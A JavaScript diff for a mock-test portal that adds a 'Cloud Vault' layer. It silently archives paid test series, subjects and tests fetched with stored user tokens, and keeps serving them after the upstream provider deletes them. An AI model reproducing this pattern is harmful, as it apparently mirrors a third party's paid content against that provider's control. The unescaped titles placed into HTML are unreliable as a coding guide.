+async function fetchVaultFoldersFallback(seriesId) {
+    if (typeof window.rwaSecureFetch !== "function") return [];
+    try {
+        const res = await window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/vault/folders?series_id=${encodeURIComponent(seriesId)}`);
+        return (res.ok && res.data && Array.isArray(res.data.folders)) ? res.data.folders : [];
+    } catch { return []; }
+}
+
+async function fetchVaultTitlesFallback(seriesId, subjectId) {
+    if (typeof window.rwaSecureFetch !== "function") return [];
+    try {
+        const res = await window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/vault/titles?series_id=${encodeURIComponent(seriesId)}&subject_id=${encodeURIComponent(subjectId || "-1")}`);
+        return (res.ok && res.data && Array.isArray(res.data.tests)) ? res.data.tests : [];
+    } catch { return []; }
+}
 
 // =====================================================
 // SLIDE NAVIGATION & HEADER SYNC
@@ -1185,7 +1215,7 @@ function goHomeHub() {
 window.goHomeHub = goHomeHub;
 
 window.forceSyncCurrentExplorer = function() {
-    if (typeof window.tsToast === "function") window.tsToast("🔄 Live server se fresh data sync ho raha hai...", "info");
+    if (typeof window.tsToast === "function") window.tsToast("🔄 Live + Cloud Vault sync ho raha hai...", "info");
     if (window.state.view === "ts_list") openTestSeriesExplorer("paid_ts", true);
     else if (window.state.view === "ts_subjects") openTestSeriesSubjects(window.state.activeSeriesId, window.state.activeSeriesTitle);
     else if (window.state.view === "ts_tests") openTestSeriesTitles(window.state.activeSeriesId, window.state.activeTsSubId || "-1", window.state.activeTsSubName || window.state.activeSeriesTitle);
@@ -1220,7 +1250,7 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
         if (authToken) headers["Authorization"] = authToken;
         const res = await fetch(`${API_BASE}${endpoint}`, { headers });
         const json = await res.json();
-        if (statusBadge) statusBadge.textContent = "● Live";
+        if (statusBadge) statusBadge.textContent = "Live";
         return json;
     } catch {
         try {
@@ -1229,11 +1259,11 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
             const wRes = await fetch(workerUrl);
             if (wRes.ok) {
                 const wJson = await wRes.json();
-                if (statusBadge) statusBadge.textContent = "● Live";
+                if (statusBadge) statusBadge.textContent = "Live";
                 return wJson;
             }
         } catch {}
-        if (statusBadge) statusBadge.textContent = "● Hybrid";
+        if (statusBadge) statusBadge.textContent = "Vault";
         return null;
     }
 }
@@ -1248,7 +1278,7 @@ async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
 }
 
 // =====================================================
-// EXPLORER VIEWS
+// EXPLORER VIEWS (LIVE + CLOUD VAULT MERGE — DELETED SERIES STAY LIVE!)
 // =====================================================
 function matchesSeriesCategory(title, cat) {
     if (!cat || cat === "all") return true;
@@ -1272,12 +1302,18 @@ window.applySeriesCategory = function(cat, btn) {
 function drawPaidSeriesCards(combined, updateTotals = true) {
     const grid = document.getElementById("mainGrid");
     const seen = new Set(), uniqueSeries = [];
-    combined.forEach(ts => { if (ts && ts.id && !seen.has(String(ts.id))) { seen.add(String(ts.id)); uniqueSeries.push(ts); } });
+    combined.forEach(ts => {
+        const sid = ts && String(ts.id || ts.series_id || "").trim();
+        if (sid && !seen.has(sid)) {
+            seen.add(sid);
+            uniqueSeries.push({ ...ts, id: sid });
+        }
+    });
 
     if (updateTotals) {
         let totalTestsSum = 0;
         uniqueSeries.forEach(ts => {
-            const paidCnt = parseInt(ts.paidtest || ts.total_tests || ts.test_count || 0) || 0;
+            const paidCnt = parseInt(ts.paidtest || ts.total_tests || ts.test_count || ts.saved_tests_count || 0) || 0;
             const freeCnt = parseInt(ts.freetest || 0) || 0;
             totalTestsSum += (paidCnt + freeCnt) > 0 ? (paidCnt + freeCnt) : 20;
         });
@@ -1294,7 +1330,7 @@ function drawPaidSeriesCards(combined, updateTotals = true) {
     if (!visibleSeries.length) { grid.innerHTML = `<div class="col-span-full app-card p-8 text-center text-xs font-bold opacity-70">Is category mein koi test series nahi mili.</div>`; return; }
 
     visibleSeries.forEach(ts => {
-        const paidCnt = parseInt(ts.paidtest || ts.total_tests || ts.test_count || 0) || 0;
+        const paidCnt = parseInt(ts.paidtest || ts.total_tests || ts.test_count || ts.saved_tests_count || 0) || 0;
         const freeCnt = parseInt(ts.freetest || 0) || 0;
         const seriesTestTotal = (paidCnt + freeCnt) > 0 ? (paidCnt + freeCnt) : 20;
         const safeTitle = (ts.title || "Paid Test Series").replace(/'/g, "");
@@ -1313,7 +1349,7 @@ function drawPaidSeriesCards(combined, updateTotals = true) {
                     </div>
                 </div>
                 <div class="p-4 pt-2 flex items-center justify-between gap-2">
-                    <span class="text-xs font-extrabold opacity-65">Official Mock</span>
+                    <span class="text-xs font-extrabold opacity-65">${ts._fromVaultOnly ? "☁️ Cloud Archive" : "Official Mock"}</span>
                     <button type="button" class="btn-watch text-xs">Open Series</button>
                 </div>
             </div>`;
@@ -1336,13 +1372,24 @@ async function openTestSeriesExplorer(mode = "paid_ts", forceRefresh = false) {
     }
 
     renderTsSkeletonCards(grid, 6);
-    const [p0, p10, p20] = await Promise.all([
+    const [p0, p10, p20, vaultSeries] = await Promise.all([
         fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, primaryTok, () => []),
         fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, primaryTok, () => []),
-        fetchAPIWithToken(`/get/test_series?start=20&search=&client_api_url=&exam_id=`, primaryTok, () => [])
+        fetchAPIWithToken(`/get/test_series?start=20&search=&client_api_url=&exam_id=`, primaryTok, () => []),
+        fetchVaultSeriesFallback()
     ]);
 
-    const combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : []), ...(Array.isArray(p20) ? p20 : []), ...DB.paidTestSeries];
+    const liveCombined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : []), ...(Array.isArray(p20) ? p20 : [])];
+    // Auto-save newly discovered live series to Cloud Vault (zero duplicates!)
+    if (liveCombined.length > 0) vaultSyncSeriesBg(liveCombined);
+
+    // Merge Vault series so even if upstream deletes a series, it remains LIVE directly from Cloud Vault!
+    const liveIds = new Set(liveCombined.map(x => String(x && x.id || "")));
+    const vaultOnly = (Array.isArray(vaultSeries) ? vaultSeries : [])
+        .filter(vs => vs && !liveIds.has(String(vs.series_id || vs.id || "")))
+        .map(vs => ({ ...vs, id: String(vs.series_id || vs.id), _fromVaultOnly: true }));
+
+    const combined = [...liveCombined, ...vaultOnly, ...DB.paidTestSeries];
     writeTsListCache(combined);
     drawPaidSeriesCards(combined, true);
 }
@@ -1365,9 +1412,24 @@ async function openTestSeriesSubjects(tsId, tsTitle) {
 
     const useTok = window.state.activeTokenObj || window.USER_TOKENS[0] || null;
     fetchRawJSONWithToken(`/Test_Series/test_series_by_id?id=${tsId}`, useTok);
-    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []);
+    const [liveSubs, vaultSubs] = await Promise.all([
+        fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []),
+        fetchVaultFoldersFallback(tsId)
+    ]);
 
-    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
+    if (Array.isArray(liveSubs) && liveSubs.length > 0) vaultSyncFoldersBg(tsId, liveSubs);
+
+    // Merge live + vault folders (zero duplicates)
+    const seenSub = new Set(), subs = [];
+    [...(Array.isArray(liveSubs) ? liveSubs : []), ...(Array.isArray(vaultSubs) ? vaultSubs : [])].forEach(s => {
+        const sid = s && String(s.subjectid || s.subject_id || "").trim();
+        if (sid && !seenSub.has(sid)) {
+            seenSub.add(sid);
+            subs.push({ ...s, subjectid: sid });
+        }
+    });
+
+    if (!subs.length || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
         openTestSeriesTitles(tsId, "-1", tsTitle);
         return;
     }
@@ -1407,14 +1469,29 @@ async function openTestSeriesTitles(tsId, subId, subName) {
     const uid = (useTok && useTok.userId) || (useTok && extractUidFromJwt(useTok.token)) || "2321546";
     const ep = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
 
-    let list = await fetchAPIWithToken(ep, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || []);
-    if ((!list || list.length === 0) && String(subId) !== "-1") {
-        list = await fetchAPIWithToken(`/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["708_-1"] || []);
-    } else if (!list || list.length === 0) {
-        list = DB.tsTitles[`${tsId}_-1`] || DB.tsTitles["708_-1"] || [];
+    let [liveList, vaultList] = await Promise.all([
+        fetchAPIWithToken(ep, useTok, () => []),
+        fetchVaultTitlesFallback(tsId, subId)
+    ]);
+
+    if ((!liveList || liveList.length === 0) && String(subId) !== "-1") {
+        liveList = await fetchAPIWithToken(`/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`, useTok, () => []);
     }
-    window.state.lastRenderedTestList = list;
-    renderTestTitlesGrid(list, tsId, useTok, "all");
+
+    if (Array.isArray(liveList) && liveList.length > 0) vaultSyncTitlesBg(tsId, subId, liveList);
+
+    // Merge live + cloud vault tests (deleted upstream tests stay live from Cloud Vault!)
+    const seenT = new Set(), mergedList = [];
+    [...(Array.isArray(liveList) ? liveList : []), ...(Array.isArray(vaultList) ? vaultList : [])].forEach(t => {
+        const tid = t && String(t.id || t.test_id || "").trim();
+        if (tid && !seenT.has(tid)) {
+            seenT.add(tid);
+            mergedList.push({ ...t, id: tid });
+        }
+    });
+
+    window.state.lastRenderedTestList = mergedList;
+    renderTestTitlesGrid(mergedList, tsId, useTok, "all");
 }
 window.openTestSeriesTitles = openTestSeriesTitles;
 
@@ -1505,7 +1582,7 @@ function renderTestTitlesGrid(list, tsId, boundTok, filterMode = "all") {
             <div class="grid-card p-4 sm:p-5 flex flex-col justify-between gap-3">
                 <div>
                     <h4 class="font-black text-base sm:text-lg leading-snug">${t.title}</h4>
-                    <div class="mt-2 flex items-center gap-2 flex-wrap">${topBadgeHtml}${isSectional ? `<span class="px-2 py-0.5 rounded-full bg-rose-100 text-rose-700 text-[10px] font-black">Sectional</span>` : ""}${hasOptional ? `<span class="px-2 py-0.5 rounded-full bg-purple-100 text-purple-800 text-[10px] font-black">Optional</span>` : ""}</div>
+                    <div class="mt-2 flex items-center gap-2 flex-wrap">${topBadgeHtml}${t.has_full_bank ? `<span class="px-2 py-0.5 rounded-full bg-sky-100 text-sky-800 text-[10px] font-black">☁️ Vault Ready</span>` : ""}${isSectional ? `<span class="px-2 py-0.5 rounded-full bg-rose-100 text-rose-700 text-[10px] font-black">Sectional</span>` : ""}${hasOptional ? `<span class="px-2 py-0.5 rounded-full bg-purple-100 text-purple-800 text-[10px] font-black">Optional</span>` : ""}</div>
                     <div class="text-xs font-bold opacity-65 mt-2">${t.questions || 50} Qs • ${timeLabel} • ${t.marks || 100} Marks</div>
                 </div>
                 <div class="flex items-center gap-2 pt-2 border-t border-sky-200/40 dark:border-slate-700/60 flex-wrap">${actionButtonsHtml}</div>
@@ -1573,3 +1650,4 @@ restoreFromPermanentIDB();
 openTestSeriesExplorer("paid_ts", false);
 processPendingBotSync();
 if (typeof window.checkTsPortalStatusAndNotices === "function") window.checkTsPortalStatusAndNotices();
+checkIncomingChallengeUrl();
